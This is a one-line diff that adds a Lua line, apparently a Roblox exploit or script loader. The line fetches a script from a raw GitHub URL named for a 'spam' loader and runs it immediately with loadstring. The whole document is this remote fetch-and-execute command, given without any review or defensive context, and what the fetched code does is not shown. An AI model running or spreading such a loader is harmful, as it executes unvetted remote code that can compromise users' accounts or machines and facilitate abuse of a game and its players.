@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/unseen-liminality-spam3-gr6v9zg1mcr7n6.lua"))()
